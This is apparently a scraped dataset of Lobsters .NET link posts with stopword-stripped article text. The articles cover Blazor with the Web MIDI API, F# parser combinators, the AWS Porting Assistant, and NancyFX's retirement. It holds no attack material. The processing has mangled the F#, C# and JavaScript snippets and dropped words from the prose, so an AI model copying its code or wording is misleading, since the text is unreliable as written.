input top left node expression alternatively connected sequence concatenated using concatenate node output expression empty unless one node connected output node node information node found clicking button next title use regex functionality implemented provided node create text node escape disabled input part expression manually replacement use bottom panel test string searching andor replacement valid net regex replacement string used including named andor numbered group reference bottom right panel show result replacement contributing contribution welcome ideally start creating issue also check similar tool called regex node made johannes vollmer connection nodexr regex node fact nt even know existed released polished alternative need javascript regular expression
9,Lobsters,dotnet,"C#, F#, .NET programming",V-Drum Explorer: Blazor and the Web MIDI API,https://codeblog.jonskeet.uk/2020/07/12/v-drum-explorer-blazor-and-the-web-midi-api/,vdrum explorer blazor web midi api,blazor web midi api friday ne tech web midi api blazor maui jsfiddle saturday morning step jsfiddle midi test initialize midi handy set example http test list midi port test dump midi message console test request name kit step vanilla blazor project step listing midi port blazor substep create new page substep initialize midi blazor university javascript interop substep use callback better library pattern javascript best practice blog post substep listing midi port step retrieve kit name blazor whoa stack overflow question stack overflow question saturday afternoon step retrieve kit name blazor saturday evening interlude refactoring midi access managedmidi sunday morning rewriting existing application code blog post implementing midi interface generalizing application code sunday afternoon publishing web site google cloud storage configuring bucket appropriately tidying blazor app speeding kit name access republish gsutil tool load balancer updating conclusion http vdrumexplorerjonskeetuk normal place like,blazor web midi api friday yesterday speaking ne tech user group vdrum explorer someone mentioned web midi way accessing local midi device browser grasp javascript tenuous okay write c using blazor theory could build equivalent vdrum explorer running entirely browser using webassembly mean never worry installer want get ahead suspect wpf later maui still way forward least prove fun investigation never used web midi api used blazor year weekend sure find spare hour let see far get kick going write progress blog post go adding timestamp periodically see long take thing admittedly whilst writing time promise edit post clarity typo etc idea turn complete failure life goal mind end weekend blazor web app running locally start deploying hard interesting point detect drum module list name kit module list step expect take see go use jsfiddle try access web midi api list port open input output port listen midi message dumped console send sysex message hardcoded request name kit start new blazor project check get work try access midi port blazor listing port start expand midi access test everything step loop kit instead first one involve checksum computation app copying code vdrum explorer project get far happy bonus step get far would really interesting try depend vdrum explorer project vdrumexplorermodel vdrumexplorermidi modifying midi project use web midi point code blazor app could really quite displaying readonly tree view probably hard maybe sound like fun weekend ahead saturday morning step jsfiddle midi time turn bring midi api doc jsfiddle let give strike might useful able save effort jsfiddle account may necessary may make thing let create account first problem see make console expect result end single line bottom right hand corner could open chrome console course jsfiddle one would nice use let see happens write ah expands data okay test initialize midi midi api doc really handy set example copypaste finding hard resist temptation change whitespace something comfortable copy example failed get midi access securityerror failed execute requestmidiaccess navigator midi disabled document feature policy darn look featurepolicy mdn search jsfiddle featurepolicy find http specifically midi access apparently thing work slightly differently saved fiddle let try saving midi ready hurray test list midi port copypaste example fiddle couple extra line differentiate input output call listinputsandouptuts midi ready input port input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined input port type undefined id undefined manufacturer undefined name undefined version undefined output port output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined output port type undefined id undefined manufacturer undefined name undefined version undefined hmm ideal clearly found port six input output expect one two use property add consolelog output loop show entry key value foreach get suggesting example iterating property collection rather entry using var input midiaccessinputsvalues still give anything obviously useful keep mind know little javascript sure answer obvious many let try using foreach instead like function listinputsandoutputs midiaccess consolelog input port midiaccessinputsforeach input consolelog input port type inputtype id inputid manufacturer inputmanufacturer name inputname version inputversion consolelog output port midiaccessoutputsforeach output consolelog output port type outputtype id outputid manufacturer outputmanufacturer name outputname version outputversion output much promising midi ready input port input port type input id manufacturer microsoft corporation name version output port output port type output id manufacturer microsoft corporation name version test dump midi message console hardcode input output port id get c something reasonable adapting example web midi doc slightly get function logmidimessage message var line midi message var eventdatalength line eventdata tostring consolelog line function onmidisuccess midiaccess var input midiaccessinputsget inputonmidimessage logmidimessage hit drum see midi message likewise make change module eg switching kit get reported well know sysex message working test request name kit timestamp point need go back vdrum explorer code doc kit name first byte kitcommon container start kit container kit container kit start need create data request message byte starting address hijacking command console app getting print midi message need send byte easy enough adapting example web midi note annoyance point forking jsfiddle seem working properly get new id change title way show fiddle properly ah look like need fork change title set base ideal work expect code work var output midiaccessoutputsget var requestmessage outputsend requestmessage see sign kit sent back response worse add consolelog send script get logged either maybe throwing exception aha yes exception failed execute send midioutput system exclusive message allowed index ah requestmidiaccess call specifically requesting sysex access interesting able receive sysex message even though send changing call pas sysex true get back midi message look like probably contains kit name hooray step done timestamp took hour bad step vanilla blazor project okay within existing vdrumexplorer solution add new project find blazor project template choose get interested aspnet core hosted option may want eventually let bother sidethought nothosted version may able try hosting file google cloud storage hmmm let try build oh failed resolveblazorruntimedependencies task failed unexpectedly error systemiofilenotfoundexception could load file assembly vdrumexplorerblazordll one dependency system find file specified surprising also surprising look like got aspnet core given tick box visual studio update maybe help upgrading good measure let blow away new project case project template changed time make try new nope still failing way wonder whether pinned net core sdk older version causing problem ah yes globaljson file drum specifies aha updating use work bit time wasted bad running app work including hitting breakpoint time move onto midi stuff timestamp step listing midi port blazor substep create new page let create new razor page thought would add new item razor page come cshtml file instead razor file everything else maybe despite page directory razor extension razor page razor component look like feeling could get depth really rapidly properly read bunch doc razor various talk used done either quite read fundamental first hack copy paste experiment approach learning new technology generally feel little le comfortable latter definitely get result quicker provide good foundation real work still firmly experimentation territory hack new page initialize midi button two label input port output port add nav menu run seems well eventually may want make default landing page come later time dive j substep initialize midi let rush listing port initializing midi would good add status field label start looking j interop heard blazor university probably good starting point yes section javascript interop worryingly far toc ie skipping awful lot information get far plough calling requestmidiaccess function initializemidi relatively straightforward one caveat know express result type know javascript promise refer within c code let use object start private async task initializemidi var promise await jsruntimeinvokeasync object navigatorrequestmidiaccess timespanfromseconds looking carefully docuemntation look like effectively keep reference javascript object within c code everything basically json serializeddeserialized across boundary fairly reasonable mean need write javascript code suspect plan write bunch javascript code razor page yes want move keep global midi variable keep initialized midi access declare javascript function everything need midi basically proxy midi variable really hoped avoid writing javascript running blazor never mind plan fails first step meant write script within razor page okay let create midijs script include indexhtml unfortunately asynchrony turn tricky really want able pas callback javascript code involves creating dotnetobjectreference managing lifetime slightly annoying fiddly come back eventually keep state javascript ask status waiting second private async task initializemidi await jsruntimeinvokeasync object initializemidi timespanfromseconds await taskdelay status await jsruntimeinvokeasync string getmidistatus result yes see midi initialized c code fetch status javascript time meeting come back look making javascript bit cleaner writing callback timestamp substep use callback better library pattern timestamp back currently midijs file introduces function global namespace let follow javascript best practice page guidance instead var midi function var access null var status uninitialized function initialize success function midiaccess access midiaccess status initialized failure message status failed message navigatorrequestmidiaccess sysex true success failure function getstatus return status return initialize initialize getstatus getstatus actually good really know least good enough next let work callback ideally able return something javascript initialize method await interesting blog post really long criticism great post explains everything really well involved suspect bit hackery allow simpler le elegant solution fine let create promisehandler class proxy object javascript using microsoftjsinterop using system using systemthreadingtasks namespace vdrumexplorerblazor public class promisehandler idisposable public dotnetobjectreference promisehandler proxy get private readonly taskcompletionsource int tc public promisehandler proxy dotnetobjectreferencecreate tc new taskcompletionsource int jsinvokable public void success tcstrysetresult jsinvokable public void failure string message tcstrysetexception new exception message public task task tcstask public void dispose proxydispose create instance initializemidi pas proxy javascript private async task initializemidi var handler new promisehandler await jsruntimeinvokeasync object midiinitialize timespanfromseconds handlerproxy try await handlertask status initialized catch exception e status initialization failed emessage javascript us proxy object promise handling function initialize handler success function midiaccess access midiaccess handlerinvokemethodasync success failure message handlerinvokemethodasync failure message navigatorrequestmidiaccess sysex true success failure quite explicit seems job least take long get working timestamp substep listing midi port listing port involve promise involve iterator dubious able return directly let create array javascript copy port function getinputports var ret accessinputsforeach input retpush id inputid name inputname return ret initially tried pushing input array way end data clear json returned across jsnet boundary match expected net need declare class receive data public class midiport jsonpropertyname id public string id get set jsonpropertyname name public string name get set get input port display via field hooked razor page var input await jsruntimeinvokeasync list midiport midigetinputports timeout inputdevices stringjoin inputsselect input inputid inputname success timestamp surprisingly quick step retrieve kit name blazor need two extra bit midi functionality sending receiving data hoping exchanging byte array via blazor straightforward matter creating callback adding function javascript send message add callback message received timestamp okay well turned exchanging byte array quite simple hoped needed j side otherwise transmitted json object discovering went via creating midimessage class might well keep around got receive message timestamp blazor state change detection include call listadd reasonable shame spot observablecollectionadd either though fix calling statehaschanged though ui display message three bit involved well simple midimessage class callback class delegate action public class midimessagehandler idisposable public dotnetobjectreference midimessagehandler proxy get private readonly action midimessage handler public midimessagehandler action midimessage handler proxy dotnetobjectreferencecreate thishandler handler jsinvokable public void onmessagereceived midimessage message handler message public void dispose proxydispose javascript use function addmessagehandler portid handler accessinputsget portid onmidimessage function message need data explicitly let create new object var jsonmessage data windowbtoa messagedata timestamp messagetimestamp handlerinvokemethodasync onmessagereceived jsonmessage c code receive callback subscribe initializemidi var messagehandler new midimessagehandler messagereceived await jsruntimeinvokevoidasync midiaddmessagehandler timeout input id messagehandlerproxy separate method callback could used local method lambda though private void messagereceived midimessage message messagesadd bitconvertertostring messagedata blazor nt know collection changed even make observablecollection statehaschanged timestamp let try sending sysex message request kit easy bit except work log show following error unhandled exception rendering component failed execute send midioutput function found matched signature provided maybe another issue let try explicitly data nope error let try hardcoding data want send using javascript worked work suggests windowatob call behaving expected could use logging let try putting breakpoint javascript done hopefully open chrome console whoa breakpoint worked visual studio instead amazing see atob data returned string array stack overflow question potential option really horrible work work well sort midi message get back much longer expected longer get jsfiddle maybe callback working properly timestamp okay btoa want either stack overflow question go detail accepted answer us ton code rightclicking wwwroot give option clientside library let give go see make side problem simpler timestamp well work library added wwwroot directory trying use midijs added import statement start caused error use import statement outside module guess really need know javascript module whether midijs one hmm time lunch saturday afternoon timestamp back lunch chat parent let another look side note visual studio anything document open taking cpu seem right oh well try import script directly script tag end error uncaught referenceerror export defined bizarrely enough error message often refers libts even made sure typescript library wwwroot okay got work horrible hack copying file wwwroot removing removing everything export may investigate library point fundamentally inabilty correctly encodedecode single timeconsuming frustrating part far sigh also result something happy put github involves copy library file rather using intended timestamp step retrieve kit name blazor okay got notatall decoded kit name successfully let try looping get decoding go involve copying real vdrum explorer code create data request message programmatically decode data set message love add reference vdrumexplorermidi definitely yet need remove commonsmidi reference replace everything use going step timestamp success copying quite bit code everything nothing particularly unexpected stage deeply encouraging going leave day tomorrow try change abstraction used vdrum explorer integrate saturday evening timestamp interlude refactoring midi access okay turn really want wiat tomorrow however next step going code genuinely want keep let commit everything done far new branch go back branch aim step make midi access replaceable need hotreplaceable least yet mind using static property current midi implementation make make difriendly later two project going change vdrumexplorermodel vdrumexplorermidi model refers midi moment midi refers managedmidi library plan move code midi model without reference managedmidi type define interface eg imidiinput imidioutput imidimanager write rest midirelated code refer interface ditch vdrumexplorermidi add vdrumexplorermidimanagedmidi implement model interface term managedmidi library hope tomorrow blazor implementation library confidence work reasonably well done thing audio recordingplayback device naudio implementation project let go timestamp okay went pretty much planned actually able simplify code bit nice potentially refactoring moduleaddress datasegment rolandmidiclient project make rolandmidiclientrequestdataasync accept moduleaddress return datasegment come later though admittedly testing found kit invalid value one instrument need look later think new issue timestamp blazor midi interface implementation wait tomorrow anticipate tricky sunday morning timestamp okay let plan remove code copied rest vdrum explorer blazor project need add reference blazor project vdrumexplorermodel implement midi interface rework code enough get previous functionality working rewrite code hardcoded module address instead detecting right schema listing kit attached supported module maybe publish removing code adding project reference trivial course point code compile choice could get code compiling using midi interface without implementing interface could implement interface first rewriting existing application code despite order listed going rewrite application part first clear error list making easier spot mistake implementing interface downside bit code need stash somewhere part midi implementation eventually without wanting get right yet create webmidi folder implementation scratchpadtxt file copy required right code point getting really annoyed syntax highlighting razor file know petty grey background code really ugly going go code anyway let actually use add new razor page time move code fix two minute later look like v provides least option quite want really want partial class codebehind model entirely possible equivalent case partial class closer right blog post tell exactly need timestamp starting actually perform migration realise need ilogger minute use nulllogger later want implement logger add page already log method simple timestamp quicker expected course know whether work implementing midi interface creating webmidimanager webmidiinput webmidioutput class show little really need code written course moment going worry closing midi connection imidiinputdispose etc leave everything open opened use single netside event handler input port event subscriberemove handling net side manage underlying vdrum explorer interface end getting callback client instance disposal oddity output reused though stateless effectively timestamp okay bad significant surprise although one bit slight ugliness imidioutputsend midimessage method synchronous calling javascript interop always asynchronous happens mostly okay send message meant effectively fireandforget anyway mean call fails spot let see actually nope yet initialization fails read property input null oddly second click button initialize midi although list kit yet maybe timing thing going ah yes forgotten initialization got await initial start promise call await promise handler easy enough okay fixed still listing kit step debugger model code would really help got log implementation point let quickly timestamp great get nice log device detection going input device output device detecting device midi port name device detected midi port skipping known module detected aborting look like receiving response device port request nothing obviously wrong code via quick inspection let add console logging javascript side get clearer picture hmm sending message port object object sound promising port id ah yes simple mistake webmidioutput line runtimeinvokevoidasync midisendmessage runtime messagedata runtimeinvokevoidasync midisendmessage port messagedata amazing often code go wrong soon lean static fix boom work generalizing application code timestamp list kit list anything got connected got fairly nasty code computing module address fetch let see much easier make got full power model project play timestamp turn really easy inefficient public information schema field container store kit name load data one kit time retrieve formatted kit name loaded data involves loading way information really need ideal worked first time first listed kit worked turn turn rerun boom even worked aerophone received last week mostly inittone aerophone split user kit preset kit user kit populated start name repeated kit subname aerophone yet changed code handle hey enough morning certainly honestly expected integration go quickly afternoon investigate hosting option try put code others timestamp tidying blog post bit decided definitely want include code github publish result online mean working library least mitlicensed bad fabulous thing show talk give vdrum explorer everyone laugh javascript course sunday afternoon publishing web site timestamp running dotnet publish c release blazor directory creates output look like able serve statically hoped unchecked aspnet core hosting box project creation one simple way serving static content use google cloud storage uploading file bucket configuring bucket appropriately let give go plan basically follow tutorial got simple indexhtml file working upload blazor application already http load balancing google cloud jonskeetuk domain hosted google domain straightforward take step went tutorial good job sample page working served http new googlemanaged ssl certificate timestamp time upload blazor app brilliant state moment step done want get rid counter sample etc come later somewhatexpecting edit mime type well see google cloud storage browser let upload file yup work admittedly slightly irritating upload directory separately uploading wwwroot would create new wwwroot directory expect using gsutil command line make easier future worked timestamp previous step took minute computer also chasing cat away frog hunting garden tidying blazor app point site really single page need navbar etc timestamp okay look lot better speeding kit name access folk going using though really want speed kit loading let see hard model code timestamp done minute implement new functionality bit le actually due typing going point noting brag emphasize performed integration main model code much comfortable develop really quickly thing either javascript blazor code would much le pleasant republish let try gsutil command mentioning earlier delete everything storage bucket delete previous release build publish dotnet publish c release cd gsutil cp r g vdrumexplorerweb last command explained bit gustil invoke gsutil tool perform operation parallel cp copy r recursively source directory g vdrumexplorerweb target bucket hooray much simpler web interface useful general load balancer updating load balancer keep losing configuration backend bucket certificate strongly suspect created kubernetes engine actually update configuraiton let flow ah turn ingres currently support storage bucket backend create new load balancer could served http without load balancer anything without http support feel pretty ropy course load balancer cost money may keep forever sake single demo app sure afford could useful static site option serve application cluster easy enough matter adding service conclusion okay done amazing weekend thrilled ended got suitable roland instrument try http vdrumexplorerjonskeetuk code github yet expect within week normal place edited initially slightly disappointed seem work phone sure happened tried innitially know still claiming connection insecure managed get site working phone connecting bluetooth running net code talking javascript talking midi bluetooth list content drum really feel like work annoying aspect definitely firstly javascript come reliable implementation situation anyway secondly adding client library rather fraught expected sure doable beyond level expertise overall impressed blazor definitely resurrect noda time blazor app time zone conversion working ago like like loading related
11,Lobsters,dotnet,"C#, F#, .NET programming",Comparing compiler construction in Clojure and F#,https://www.youtube.com/watch?v=t8usj1fN9rs,comparing compiler construction clojure f,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature language language comparing compiler construction clojure f ramsey nasser youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature language language comparing compiler construction clojure f ramsey nasser youtube
12,Lobsters,dotnet,"C#, F#, .NET programming",Understanding Parser Combinators,https://fsharpforfunandprofit.com/posts/understanding-parser-combinators/,understanding parser combinators,slide video talk topic second post third post last post fparsec implementation parsing hardcoded character implementation parsing specified character implementation returning successfailure functional error handling implementation switching curried implementation currying rewriting inner function benefit curried implementation partially apply implementation encapsulating parsing function type testing wrapped function combining two parser sequence combinator functional programming pattern testing choosing two parser combinator testing combining choosing list parser see post monoids review listing parser library far gist summary next post gist information fparsec library understanding parser combinators series comment comment powered disqus blog comment powered,part understanding parser combinators series update slide video talk topic series look socalled work order understand something nothing like building create basic parser library scratch useful finish building complete json parser term like make approach seem complicated rather attempting explain concept front dive start coding build complex stuff incrementally via series implementation implementation slightly different previous one using approach hope stage design concept easy understand end series parser combinators become completely demystified four post series first post look basic concept parser combinators build core library second post build useful library combinators third post work providing helpful error message last post build json parser using parser library obviously focus performance efficiency hope give understanding enable use library like fparsec effectively way big thank stephan tolksdorf created fparsec make first port call net parsing need implementation parsing hardcoded character first implementation create something par single hardcoded character case letter get much simpler work input parser stream character could use something complicated use string stream empty return pair consisting false empty string first character stream return pair consisting true remaining stream character first character stream return false unchanged original stream character code let aparser str stringisnullorempty str false else str let remaining str true remaining else false str signature aparser val aparser string bool string tell u input string output pair consisting boolean result another string remaining input like test first good input let inputabc abc aparser inputabc result see consumed remaining input bc bad input let inputzbc zbc aparser inputzbc give result case first character consumed remaining input still zbc incredibly simple parser understand everything follows easy implementation parsing specified character refactor pas character want match rather hard coded time rather returning true false return message indicating happened call function pchar code let pchar chartomatch str stringisnullorempty str let msg input msg else let first str first chartomatch let remaining str let msg sprintf found c chartomatch msg remaining else let msg sprintf expecting c got c chartomatch first msg str code like previous example except unexpected character shown error message signature pchar val pchar char string string string tell u input pair string character match output pair consisting string result another string remaining input test first good input let inputabc abc pchar inputabc result consumed remaining input bc bad input let inputzbc zbc pchar inputzbc give result expecting got z zbc first character consumed remaining input still zbc pas z parser succeed pchar z inputzbc found z bc implementation returning successfailure want able tell difference successful match failure returning stringlytyped message helpful define special type indicate difference call result type result success failure string success case generic contain value failure case contains error message note using successfailure approach see talk functional error handling rewrite parser return one result case like let pchar chartomatch str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg signature pchar val pchar char string result char string tell u output result success case contains matched char remaining input string test first good input let inputabc abc pchar inputabc result consumed remaining input bc also get actual matched char case bad input let inputzbc zbc pchar inputzbc give result failure expecting got z case failure case returned appropriate error message diagram input output implementation switching curried implementation previous implementation input function tuple pair requires pas input functional language like f idiomatic use curried version like let pchar chartomatch str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg see difference difference first line even subtle uncurried tuple version let pchar chartomatch str curried version let pchar chartomatch str difference much obvious look type signature signature uncurried tuple version val pchar char string result char string signature curried version val pchar char string result char string curried version pchar represented diagram currying unclear currying work post basically mean multiparameter function written series oneparameter function word twoparameter function signature val add x int int int written equivalent oneparameter function return lambda like let add x fun x return lambda function return inner function like let add x let innerfn x innerfn return innerfn second case inner function used signature look slightly different val add x int int int parenthesis around last parameter ignored signature practical purpose original one original automatic currying two parameter function val add x int int int explicit currying inner function val add x int int int rewriting inner function take advantage currying rewrite parser oneparameter function parameter chartomatch return inner function new implementation inner function cleverly named innerfn let pchar chartomatch define nested inner function let innerfn str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg return inner function innerfn type signature implementation look like val pchar chartomatch char string result char string functionally equivalent previous version char string result char string word implementation identical caller point view twoparameter implementation let pchar chartomatch str oneparameter implementation inner function let pchar chartomatch let innerfn str return inner function innerfn benefit curried implementation nice curried implementation partially apply character want parse like later supply second parameter let inputabc abc parsea inputabc success bc let inputzbc zbc parsea inputzbc failure expecting got z point stop review going pchar function two input provide one input char match result function returned provide second input stream character parsing function creates final result value diagram pchar time emphasis partial application important understand logic moving rest post build basic design implementation encapsulating parsing function type look parsea example see function type val parsea string result char string type bit complicated use encapsulate type called parser like type parser parser string result string encapsulating go design design change implementation simple need change way inner function returned let pchar chartomatch let innerfn str return inner function innerfn let pchar chartomatch let innerfn str return wrapped inner function parser innerfn testing wrapped function ok test let parsea pchar let inputabc abc parsea inputabc compiler error get compiler error error value function applied course function wrapped parser data structure longer directly accessible need helper function extract inner function run input stream call run implementation run let run parser input unwrap parser get inner function let parser innerfn parser call inner function input innerfn input run parsea parser various input let inputabc abc run parsea inputabc success bc let inputzbc zbc run parsea inputzbc failure expecting got z got basic parser type hope make sense far combining two parser sequence combinator last implementation good enough basic parsing logic revisit later move level develop way combining parser together mentioned beginning start combining two parser sequence example say want parser match could try writing something like let parsea pchar let parseb pchar b let parseathenb parsea parseb give u compiler error output parsea match input parseb composed like familiar functional programming pattern need chain sequence wrapped type together like happens frequently solution bind function however case implement bind instead go straight andthen implementation implementation logic follows run first parser failure return otherwise run second parser remaining input failure return parser succeed return pair tuple contains parsed value code andthen let andthen let innerfn input run input let run input test result failuresuccess match failure err return error failure err success run remaining input let run test result failuresuccess match failure err return error failure err success combine value pair let newvalue return remaining input success newvalue return inner function parser innerfn implementation follows logic described also define infix version andthen use like regular composition note parenthesis needed define custom operator needed infix usage look signature andthen val andthen parser parser b parser b see work two parser different type b testing andthen test see work first create compound parser let parsea pchar let parseb pchar b let parseathenb parsea parseb look type see three value type parser val parsea parser char val parseb parser char val parseathenb parser char char parseathenb type parser char char meaning parsed value pair char since combined parser parseathenb another parser use run run parseathenb abc success b c run parseathenb zbc failure expecting got z run parseathenb azc failure expecting b got z see success case pair b returned also failure happens either letter missing input choosing two parser combinator look another important way combining parser combinator example say want parser match could combine implementation logic would run first parser success return parsed value along remaining input otherwise failure run second parser original case return result success failure second parser code orelse let orelse let innerfn input run input let run input test result failuresuccess match success result success return original result failure err failed run input let run input return result return inner function parser innerfn define infix version orelse well look signature orelse val orelse parser parser parser see work two parser must type testing orelse time test first create combined parser let parsea pchar let parseb pchar b let parseaorelseb parsea parseb look type see three value type parser char val parsea parser char val parseb parser char val parseaorelseb parser char run parseaorelseb see successfully handle first character run parseaorelseb azz success zz run parseaorelseb bzz success b zz run parseaorelseb czz failure expecting b got c combining andthen orelse two basic combinators build complex one b c build aandthenborc simpler parser let parsea pchar let parseb pchar b let parsec pchar c let borelsec parseb parsec let aandthenborc parsea borelsec action run aandthenborc abz success b z run aandthenborc acz success c z run aandthenborc qbz failure expecting got q run aandthenborc aqz failure expecting c got q note last example give misleading error say really say attempt fix right later post implement better error message choosing list parser power combinators start kicking orelse toolbox use build even combinators example say want choose list parser rather two well easy pairwise way combining thing extend combining entire list using reduce working reduce see post monoids choose list parser let choice listofparsers listreduce listofparsers note fail input list empty ignore signature choice val choice parser list parser show u expected input list parser output single parser choice available create anyof parser match character list using following logic input list character char list transformed parser char using pchar finally parser combined using choice code choose list character let anyof listofchars listofchars listmap pchar convert parser choice test creating parser lowercase character digit character let parselowercase anyof z let parsedigit anyof test work expected run parselowercase abc success bc run parselowercase abc failure expecting z got run parsedigit success abc run parsedigit success abc run parsedigit abc failure expecting got error message misleading lowercase letter expected digit expected said earlier work error message later post review stop review done created type parser wrapper parsing function parsing function take input eg string attempt match input using criterion baked function match succeeds parsing function return success matched item remaining input match fails parsing function return failure reason failure finally saw way parser could combined make new parser andthen orelse choice listing parser library far complete listing parsing library far line code source code displayed also available gist open system type represents successfailure parsing type result success failure string type wrap parsing function type parser parser string result string parse single character let pchar chartomatch define nested inner function let innerfn str stringisnullorempty str failure input else let first str first chartomatch let remaining str success chartomatch remaining else let msg sprintf expecting c got c chartomatch first failure msg return wrapped inner function parser innerfn run parser input let run parser input unwrap parser get inner function let parser innerfn parser call inner function input innerfn input combine two parser andthen b let andthen let innerfn input run input let run input test result failuresuccess match failure err return error failure err success run remaining input let run test result failuresuccess match failure err return error failure err success combine value pair let newvalue return remaining input success newvalue return inner function parser innerfn infix version andthen let andthen combine two parser orelse b let orelse let innerfn input run input let run input test result failuresuccess match success result success return original result failure err failed run input let run input return result return inner function parser innerfn infix version orelse let orelse choose list parser let choice listofparsers listreduce listofparsers choose list character let anyof listofchars listofchars listmap pchar convert parser choice summary post created foundation parsing library simple combinators next post build create library many combinators source code post available gist information interesting using technique production sure investigate fparsec library f optimized realworld usage information parser combinators general search internet haskell library influenced fparsec post example using fparsec try one post understanding parser combinators series understanding parser combinators comment please enable javascript view comment powered disqus blog comment powered
13,Lobsters,dotnet,"C#, F#, .NET programming",Announcing the Porting Assistant for .NET,https://aws.amazon.com/blogs/aws/announcing-the-porting-assistant-for-net/,announcing porting assistant net,microsoft stated porting assistant net analyzing porting application net core sdk credential profile aws command line interface cli download assessed solution get started next ass project reference nuget package apis source file project reference nuget package apis source file project port project save port project deprecated api call port improving suggestion engine github user guide porting assistant net steve,net core future net version net framework last major version released microsoft stated receive bug reliability securityrelated fix going forward application want continue take advantage future investment innovation net platform need consider porting application net core also additional reason consider porting application net core benefiting innovation linux open source improved application scaling performance reducing licensing spend porting however entail significant manual effort undifferentiated updating reference project dependency porting net framework application developer need search compatible nuget package update package reference application project file also need updated net core project file format additionally need discover replacement apis since net core contains subset apis available net framework porting progress developer wade long list compile error warning determine best highest priority place continue chipping away task needle say challenging added friction could deterrent customer large portfolio application today announced porting assistant net new tool help customer analyze port net framework application net core running linux porting assistant net ass application source code full tree public api nuget package dependency identify incompatible net core guide developer compatible replacement available suggestion engine api package replacement designed improve time assistant learns usage pattern frequency missing package apis porting assistant net differs tool able ass full tree package dependency incompatible apis also us solution file starting point make easier ass monolithic solution containing large number project instead analyze aggregate information individual binary ability give developer jump start porting process analyzing porting application getting started porting application using porting assistant net easy couple prerequisite first need install net core sdk secondly need credential profile compatible aws command line interface cli although cli used required credential profile used collect compatibility information public apis package nuget core microsoft package used application public nuget package reference prerequisite taken care download run installer assistant assistant installed check application source code launch porting assistant net start menu previously assessed solution view open assessed solution screen enabling pick left select get started home page begin assessing application solution file asked select credential profile want use also elect optin share telemetry data sharing data help improve suggestion accuracy user time go useful identifying issue hope consider optingin click next browse select solution file want click ass begin analysis post going use open source nopcommerce project note using release version post version still based net framework analysis complete shown overall result number incompatible package application depends apis us incompatible overall portability score score estimation eﬀort required port application net core based number incompatible apis us working porting multiple application use identify prioritize application want start first let dig assessment overview see discovered clicking solution name take detailed dashboard see project make application solution file number incompatible package api dependency along portability score particular project current port status project also listed already begun porting application reopened assessment note project selected project tab data shown project reference nuget package apis source file tab solutionwide scope data wish first selecting project project reference tab show graphical view package dependency see majority dependency consumed case nppcore nppservices nppwebframework project view help decide might want start first get bang buck begin also select project see specific dependency clearly nuget package tab give look compatible incompatible dependency suggested replacement available apis tab list incompatible apis package many time referenced source file list source file making project application indication many incompatible api call found file selecting source file open view showing incompatible apis used suggested package version upgrade exist resolve issue suggested replacement simply updating different package version need crack open source editor update code use different api approach looking report dependencyregistrarcs exists nopweb project us autofac nuget package let start porting application starting nopcore project first navigate back project tab select project click port project porting tool help update project reference nuget package also update project file newer net core format option either making copy application solution file project file source file change made inplace elected make copy clicking save copy application source code selected location open port project view set new target framework version case list nuget dependency project need upgrade incompatible package porting assistant net give list possible version upgrade version shown number incompatible apis either remain additionally become incompatible package selected difference case later version potentially increase number incompatible apis would need manually fix source code indication help make tradeoff decision around whether upgrade latest version package stay older one select version deprecated api call field alongside package give reminder need fix code editor clicking value summarizes deprecated call continue process package dependency ready click port reference updated using ide go source file work replacing incompatible api call using porting assistant net source file deprecated api list view reference follow similar process project application improving suggestion engine suggestion engine behind porting assistant net designed learn give improved result time customer optin sharing telemetry data model behind engine result analyzing hundred thousand unique package million package version available github hope consider helping improve accuracy completeness result contributing data user guide give detail data used porting assistant net free use available steve
14,Lobsters,dotnet,"C#, F#, .NET programming","Goodbye NancyFX, Hello F#",https://blog.jonathanchannon.com/2020-06-16-goodbye-nancyfx-hello-fsharp/,goodbye nancyfx hello f,andreas håkansson carter feeling net os one example jeremy miller business change tide bytepack blog post aaron stannard refocusing energy answer f fake konrad konkosa introduction functional programming f ian russell syme taskbuilder giraffe krzysztof cieślak eugene auduchinok npgsqlfsharp future softwarepark,may already know nancyfx archived year first commit read announcement information never forget learnt codebase community around especially people involved proud honoured involved massive thank andreas håkansson teaching plenty via skype call early day many also know created carter mind nancy sat top aspnet core approach nancy offering many thing web framework usage carter steadily increased good know people value similar thing achieved nancy however paradoxically feeling brewing sometime effort almost futile feeling net os many argue believe took long think recently many come similar thought one example jeremy miller state try compete kind tool microsoft losing proposition time maybe realize upfront price significant success net os mean microsoft eventually write version whatever done already know last month microsoft openly discussed case released alternative automapper identity server proxy kit whilst using large pr marketing machine tout microsoft love os one thing clear pause think accept fact microsoft business fundamental goal make money could argue contribute os library rather embrace extend extinguish library think counter argument need support solution year instead forking library using code point time required adapt need whilst also publicly stating love os thanks library x look code create repo slowly copy codesolution problem state look released awesome go try azure question ask os library author travelled many year people writing library guise love write code make available side effect free nothing stop releasing code people view still impose licence allows author benefit financially time gone everyone releasing thing free one stand say going charge stuff people would looked funny success story servicestack identity server managed succeed net space believe time come author must unite start charging code even love writing code making available absolutely nothing wrong getting cash could offer licence allowed usage code free hit x need pay successful library started charging money potentially limit microsoft eee approach business paying support library x microsoft come along say hey look released azure cost would ask already paying x library x pay hopefully doubt limit microsoft eee approach keep vibrant ecosystem net moment people pay use microsoft library pay azure fee get support change tide changing net ecosystem united front author start charging library otherwise hit fragmentation potentially worse ecosystem still allowing microsoft wheel clone always going business pay microsoft support matter noone got fired choosing microsoft start changing people mind paying thing believe benefit everyone also need platform allow kind thing something handle payment contract information support contact information etc know bytepack allows non net package hopefully matter time someone else come platform app store great example could work imagine nuget app store downloadpurchase package think concept try buy would work extremely well could nuget app store offered author ability sell package setup ability support package provide contract buyer sort support system people bought package seek support using could onto winner think mad man idea also like link great blog post aaron stannard titled new rule playing microsoft open source sandbox aaron responds 